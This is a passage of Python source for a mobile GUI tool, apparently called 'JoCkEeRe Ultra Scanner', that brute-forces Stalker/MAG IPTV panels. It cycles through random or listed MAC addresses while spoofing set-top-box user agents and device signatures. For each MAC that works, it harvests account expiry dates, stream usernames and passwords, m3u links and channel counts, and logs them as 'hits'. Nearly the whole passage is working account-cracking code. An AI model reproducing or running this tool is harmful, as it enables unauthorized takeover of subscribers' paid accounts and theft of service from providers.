            self.add_log("❌ ERROR: Enter Panel Host:Port", error=True)
            return
        self.panel_host = (self.panel_host
                           .replace("http://", "")
                           .replace("/c", "")
                           .replace("/", ""))
        self.panel_choice = str(
            self.panel_type_spinner.values.index(self.panel_type_spinner.text) + 1
        )
        try:
            self.bots = max(1, int(self.bots_input.text))
        except:
            self.bots = 4
        self.output_mode = str(
            self.output_spinner.values.index(self.output_spinner.text)
        )

        if self.dsyno == "0":
            self.mac_prefix = self.prefix_spinner.text
            try:
                self.total_macs = max(1, int(self.mac_count_input.text))
            except:
                self.total_macs = 30000
            self.combo_data = None
        else:
            if not self.combo_path or not self.mac_list:
                self.add_log("❌ ERROR: Select combo file first", error=True)
                return
            self.total_macs = len(self.mac_list)
            self.combo_data = self.mac_list
            self.mac_prefix = ""

        # Paramètres panel
        choix = self.panel_choice
        panel_params = {
            "1":  ("portal.php", "", "/c/", "", ""),
            "2":  ("portal.php", "ultra", "/c/", "", ""),
            "3":  ("portal.php", "realblue", "/c/", "", ""),
            "4":  ("server/load.php", "", "/c/", "", ""),
            "5":  ("stalker_portal/server/load.php", "stalker", "/c/", "/stalker_portal", ""),
            "6":  ("c/server/load.php", "", "/c/", "", ""),
            "7":  ("c/portal.php", "", "/c/", "", ""),
            "8":  ("bs.mag.portal.php", "", "/c/", "", ""),
            "9":  ("magLoad.php", "", "/c/", "", ""),
            "10": ("portalstb/portal.php", "", "", "", "/portalstb"),
            "11": ("k/portal.php", "", "", "", "/k"),
            "12": ("maglove/portal.php", "", "", "", "/maglove"),
            "13": ("magaccess/portal.php", "", "", "", "/magaccess"),
            "14": ("portalmega.php", "", "/c/", "", ""),
            "15": ("powerfull/portal.php", "", "", "", "/powerfull"),
        }
        params = panel_params.get(choix, ("portal.php", "", "/c/", "", ""))
        self.uzmanm, self.uzmanc, self.buri, self.urib, self.uzmanm2 = params

        # User-Agent
        if choix in ("1",):
            self.useragent = ("Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 "
                              "(KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3")
        else:
            self.useragent = ("Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 "
                              "(KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3")

        self.running = True
        self.paused = False
        self.stop_event.clear()
        self.pause_event.set()
        self.hits = 0
        self.checked = 0
        self.start_time = time.time()

        self.hits_stat.set_value("0")
        self.checked_stat.set_value("0")
        self.progress_stat.set_value("0%")

        self.start_btn.text = "■  STOP"
        self.pause_btn.disabled = False
        self.status_label.text = "● Scanning..."
        self.status_label.color = COLORS['success']
        self.clear_log(None)
        self.save_settings()

        self.add_log(f"🚀 Starting scan on {self.panel_host}")
        self.add_log(f"   Bots: {self.bots} | MACs: {self.total_macs:,} | Mode: {self.output_spinner.text}")
        self.add_log("─" * 42)

        Clock.schedule_interval(self.update_time, 1)
        Clock.schedule_interval(self.check_completion, 2)

        self.worker_threads = []
        chunk = self.total_macs // self.bots
        for i in range(self.bots):
            start_i = i * chunk
            end_i = self.total_macs if i == self.bots - 1 else (i + 1) * chunk
            t = threading.Thread(
                target=self.scan_worker,
                args=(start_i, end_i),
                daemon=True
            )
            t.start()
            self.worker_threads.append(t)

    # ============ Worker ============
    def scan_worker(self, start_i, end_i):
        panel = self.panel_host
        url1 = f"http://{panel}/{self.uzmanm}?action=handshake&type=stb&token=&JsHttpRequest=1-xml"
        url2 = f"http://{panel}/{self.uzmanm}?type=stb&action=get_profile&hd=1&auth_second_step=1&num_banks=1&sn=0000000000001&stb_type=MAG254&image_version=218&video_out=hdmi&device_id=0000000000001&device_id2=0000000000001&signature=0000000000001&hw_version=2.4&not_valid_token=0&JsHttpRequest=1-xml"
        url3 = f"http://{panel}/{self.uzmanm}?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
        url6 = f"http://{panel}/{self.uzmanm}?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
        liveurl = f"http://{panel}/{self.uzmanm}?type=itv&action=get_genres&JsHttpRequest=1-xml"
        vodurl = f"http://{panel}/{self.uzmanm}?type=vod&action=get_categories&JsHttpRequest=1-xml"
        seriesurl = f"http://{panel}/{self.uzmanm}?type=series&action=get_categories&JsHttpRequest=1-xml"

        pattern = r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}"

        for mac_i in range(start_i, end_i):
            if self.stop_event.is_set():
                break
            self.pause_event.wait()
            if self.stop_event.is_set():
                break

            if self.dsyno == "0":
                mac = randommac(self.mac_prefix)
            else:
                macv = re.search(pattern, self.combo_data[mac_i].upper())
                if macv:
                    mac = macv.group()
                else:
                    self.update_queue.put(("checked", None))
                    continue

            self.update_queue.put(("current_mac", mac))
            mac_enc = mac.replace(":", "%3A")

            try:
                res = ses.get(url1, headers=hea1(mac_enc, self.useragent, panel),
                              timeout=30, verify=False)
                veri = res.text
            except:
                self.update_queue.put(("checked", None))
                continue
            if 'token' not in veri:
                self.update_queue.put(("checked", None))
                continue
            token = veri.split('"token":"')[1].split('"')[0]

            try:
                res = ses.get(url2, headers=hea2(mac_enc, token, self.useragent, panel),
                              timeout=30, verify=False)
                veri = res.text
            except:
                self.update_queue.put(("checked", None))
                continue
            if 'id' not in veri:
                self.update_queue.put(("checked", None))
                continue

            try:
                res = ses.get(url3, headers=hea2(mac_enc, token, self.useragent, panel),
                              timeout=30, verify=False)
                veri = res.text
            except:
                self.update_queue.put(("checked", None))
                continue

            self.update_queue.put(("checked", None))

            if 'phone' in veri or 'end_date' in veri:
                if 'end_date' in veri:
                    trh = veri.split('end_date":"')[1].split('"')[0]
                else:
                    trh_raw = veri.split('phone":"')[1].split('"')[0]
                    if trh_raw.lower()[:2] == 'un':
                        trh = trh_raw + " Days"
                    else:
                        kalan = tarih_clear(trh_raw)
                        trh = trh_raw + f" {kalan} Days"

                ip = ""
                try:
                    ip = veri.split('ip":"')[1].split('"')[0]
                except:
                    pass

                SN = hashlib.md5(mac.encode('utf-8')).hexdigest().upper()
                SNCUT = SN[:13]
                DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest().upper()
                SG = SNCUT + '+' + mac
                SING = hashlib.sha256(SG.encode('utf-8')).hexdigest().upper()
                VPN_INFO = vpnip(ip) if ip else "𝐍𝐨 𝐜𝐥𝐢𝐞𝐧𝐭 𝐢𝐩"

                cid = "94067"
                for _ in range(10):
                    try:
                        res = ses.get(url6, headers=hea2(mac_enc, token, self.useragent, panel),
                                      timeout=10, verify=False)
                        cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                        break
                    except:
                        time.sleep(1)

                link = ""
                m3ulink = ""
                user = ""
                pas = ""
                durum = "Invalid Opps"
                real = ""
                for _ in range(12):
                    try:
                        res = ses.get(
                            url_gen(cid, panel, self.uzmanm),
                            headers=hea2(mac_enc, token, self.useragent, panel),
                            timeout=30, verify=False
                        )
                        veri2 = str(res.text)
                        link = veri2.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                        real = 'http://' + link.split('://')[1].split('/')[0]
                        parts = link.replace('live/', '').split('/')
                        if len(parts) > 4:
                            user = parts[3]
                            pas = parts[4]
                        m3ulink = (f"http://{real.replace('http://','').replace('/c/','')}"
                                   f"/get.php?username={user}&password={pas}&type=m3u_plus")
                        durum = goruntu(link, panel)
                        break
                    except:
                        time.sleep(1)

                playerapi = ""
                if m3ulink:
                    playerlink = (f"http://{real.replace('http://','').replace('/c/','')}"
                                  f"/player_api.php?username={user}&password={pas}")
                    playerapi = m3uapi(playerlink, mac_enc, token, self.useragent, panel)
                    if not playerapi:
                        playerlink = (f"http://{panel.replace('http://','').replace('/c/','')}"
                                      f"/player_api.php?username={user}&password={pas}")
                        playerapi = m3uapi(playerlink, mac_enc, token, self.useragent, panel)

                kanalsayisi = filmsayisi = dizisayisi = "ɴᴏᴛ ᴀᴠᴀɪʟᴀʙʟᴇ"

                def get_count(action, key):
                    urlx = (f"http://{panel}/player_api.php?username={user}"
                            f"&password={pas}&action={action}")
                    for _ in range(4):
                        try:
                            resx = ses.get(urlx, timeout=10, verify=False)
                            return str(resx.text.count(key))
                        except:
                            time.sleep(2)
                    return "0"

                if user and pas:
                    kanalsayisi = get_count("get_live_streams", "stream_id")
                    filmsayisi = get_count("get_vod_streams", "stream_id")
                    dizisayisi = get_count("get_series", "series_id")

                livelist = vodlist = serieslist = ""
                if self.output_mode in ("1", "2"):
                    livelist = list_categories(liveurl, mac_enc, token,
                                               self.useragent, panel, ' «🕸» ')
                if self.output_mode == "2":
                    vodlist = list_categories(vodurl, mac_enc, token,
                                              self.useragent, panel, ' «👽» ')
                    serieslist = list_categories(seriesurl, mac_enc, token,
                                                 self.useragent, panel, ' «👾» ')

                imza = (
                    f"\n╔════⦿ॐ✰✰𝑱𝒐𝑪𝒌𝑬𝒆𝑹𝒆 𝑰𝑷𝑻𝑽✰✰ॐ\n"
                    f"╠❖ 𝑹𝒆𝒂𝒍: {real}{self.uzmanm2}{self.buri}\n"
                    f"╠❖ 𝑷𝒂𝒏𝒆𝒍: http://{panel}{self.urib}{self.uzmanm2}{self.buri}\n"
                    f"╠❖ 𝑴𝒂𝒄: {mac}\n"
                    f"╠❖ 𝑽𝑷𝑵: {durum if '🆅' in durum else VPN_INFO}\n"
                    f"╠❖ 𝑬𝒙𝒑𝒊𝒓𝒚: {trh}\n"
                    f"╠❖ 𝑺𝒄𝒂𝒏 𝑫𝒂𝒕𝒆: {time.strftime('%d-%m-%Y')}\n"
                    f"╠❖ 𝑺𝑵: {SN}\n"
                    f"╠❖ 𝑺𝑵𝑪𝒖𝒕: {SNCUT}\n"
                    f"╠❖ 𝑫𝒆𝒗𝒊𝒄𝒆 𝑰𝑫1: {DEV}\n"
                    f"╠❖ 𝑫𝒆𝒗𝒊𝒄𝒆 𝑰𝑫2: {SING}\n"
                    f"╠❖ 𝑯𝒊𝒕𝒔 𝑩𝒚 {nickn}\n"
                    f"╚═════⦿✰𝑱𝒐𝑪𝒌𝑬𝒆𝑹𝒆 𝑼𝒍𝒕𝒓𝒂 𝑺𝒄𝒂𝒏𝒏𝒆𝒓✰"
                )
                if len(kanalsayisi) > 1:
                    imza += (f"\n╔═❖ Channels: {kanalsayisi}\n"
                             f"╠═❖ Vod: {filmsayisi}\n"
                             f"╚═❖ Series: {dizisayisi}")
                if self.output_mode in ("1", "2"):
                    imza += f"\n\n𝑳𝒊𝒔𝒕 (𝑳𝑰𝑽𝑬): \n{livelist}"
                if self.output_mode == "2":
                    imza += (f"\n\n𝑳𝒊𝒔𝒕 (𝑽𝑶𝑫): \n{vodlist}"
                             f"\n\n𝑳𝒊𝒔𝒕 (𝑺𝑬𝑹𝑰𝑬𝑺): \n{serieslist}")

                self.update_queue.put(("hit", imza))

    # ============ Queue & timers ============
    def process_queue(self, dt):
        try:
            while True:
                msg_type, data = self.update_queue.get_nowait()
                if msg_type == "current_mac":
                    self.current_mac_label.text = f"⟳  {data}"
                elif msg_type == "checked":
                    self.checked += 1
                    self.checked_stat.set_value(f"{self.checked:,}")
                    if self.total_macs > 0:
                        pct = int((self.checked / self.total_macs) * 100)
                        self.progress_stat.set_value(f"{pct}%")
                elif msg_type == "hit":
                    self.hits += 1
                    self.hits_stat.set_value(str(self.hits))
                    framed_hit = extract_hit_info(data)
                    self.add_log(framed_hit, hit=True)
                    save_hit_to_file(data, self.panel_host)
                    if is_android:
                        try:
                            from plyer import vibrator
                            vibrator.vibrate(300)
                        except:
                            pass
        except queue.Empty:
            pass

    def update_time(self, dt):
        if self.running:
            elapsed = int(time.time() - self.start_time)
            h = elapsed // 3600
            m = (elapsed % 3600) // 60
            s = elapsed % 60
            self.time_label.text = f"⏱ {h:02d}:{m:02d}:{s:02d}"
        else:
            Clock.unschedule(self.update_time)

    def check_completion(self, dt):
        if self.running:
            alive = any(t.is_alive() for t in self.worker_threads) if self.worker_threads else False
            if not alive:
                self.finish_scan()
        else:
            Clock.unschedule(self.check_completion)

    def finish_scan(self):
        self.running = False
        self.stop_event.set()
        self.pause_event.set()
        self.start_btn.text = "▶  START"
        self.pause_btn.disabled = True
        elapsed = int(time.time() - self.start_time)
        self.status_label.text = f"✅ Done — {self.hits} hits"
        self.status_label.color = COLORS['success']
        self.add_log("\n" + "═" * 38)
        self.add_log("✅ SCAN COMPLETE")
        self.add_log(f"   Checked: {self.checked:,}  |  Hits: {self.hits}")
        self.add_log(f"   Time: {elapsed // 60}m {elapsed % 60}s")
        self.add_log(f"   Saved → {HITS_DIR}")
        self.current_mac_label.text = "Done ✅"
        if self.hits > 0:
            pop = Popup(
                title="✅ Scan Complete",
                title_color=COLORS['success'],
                content=Label(
                    text=f"[b]Hits Found: {self.hits}[/b]\n\nSaved to:\n{HITS_DIR}",
                    markup=True,
                    color=COLORS['text_primary'],
                    halign='center',
                ),
                size_hint=(0.78, 0.32),
                background_color=COLORS['bg_card'],
                separator_color=COLORS['success'],
            )
            pop.open()


if __name__ == "__main__":
    JoCkEeReApp().run()
